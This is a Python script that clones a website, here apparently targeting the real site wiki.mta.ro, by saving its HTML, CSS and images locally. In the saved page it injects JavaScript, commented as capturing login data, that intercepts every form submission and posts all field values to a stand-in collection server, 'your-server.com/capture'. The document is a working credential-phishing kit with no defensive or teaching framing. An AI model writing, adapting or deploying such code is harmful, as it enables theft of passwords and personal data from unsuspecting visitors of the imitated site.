import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def sanitize_filename(filename, default_extension="css"):
    # Remove or replace characters that are not allowed in file names
    sanitized = "".join(c for c in filename if c.isalnum() or c in (' ', '.', '_')).rstrip()
    # If the file does not have an extension or has an unusual one, add the default extension
    if not sanitized or '.' not in sanitized or sanitized.split('.')[-1] not in ['css']:
        sanitized += f".{default_extension}"
    return sanitized

def clone_website(url, output_directory):
    try:
        # Send a GET request to the URL
        response = requests.get(url)
        response.raise_for_status()  # Check for request errors

        # Parse the HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Create the output directory if it doesn't exist
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)

        # Inject JavaScript to capture login data
        script = '''
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                var forms = document.getElementsByTagName('form');
                for (var i = 0; i < forms.length; i++) {
                    forms[i].addEventListener('submit', function(event) {
                        var formData = new FormData(this);
                        var data = {};
                        formData.forEach((value, key) => {
                            data[key] = value;
                        });

                        // Send the data to your server
                        fetch('http://your-server.com/capture', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        });
                    });
                }
            });
        </script>
        '''

        # Append the script to the HTML body
        soup.body.append(BeautifulSoup(script, 'html.parser'))

        # Save the main HTML file
        with open(os.path.join(output_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        print(f"HTML content saved successfully in '{output_directory}/index.html'.")

        # Download and save all CSS files
        css_links = soup.find_all('link', {'rel': 'stylesheet'})
        for link in css_links:
            css_url = urljoin(url, link['href'])
            css_response = requests.get(css_url)
            css_response.raise_for_status()  # Check for request errors

            parsed_url = urlparse(link['href'])
            css_filename = sanitize_filename(os.path.basename(parsed_url.path))
            css_path = os.path.join(output_directory, css_filename)
            
            with open(css_path, 'w', encoding='utf-8') as css_file:
                css_file.write(css_response.text)

            link['href'] = css_filename

        print("CSS files saved and linked successfully.")

        # Download and save all images
        image_tags = soup.find_all('img')
        for img in image_tags:
            img_url = urljoin(url, img['src'])
            img_response = requests.get(img_url)
            img_response.raise_for_status()  # Check for request errors

            img_filename = sanitize_filename(os.path.basename(urlparse(img['src']).path), "jpg")
            img_path = os.path.join(output_directory, img_filename)
            with open(img_path, 'wb') as img_file:
                img_file.write(img_response.content)

            img['src'] = img_filename

        print("Images saved and linked successfully.")

        # Save the updated HTML with local references
        with open(os.path.join(output_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        print(f"Website cloned successfully in '{output_directory}'.")

    except Exception as e:
        print(f"An error occurred: {e}")


url_to_clone = "https://wiki.mta.ro"
output_folder = "mta"
clone_website(url_to_clone, output_folder)
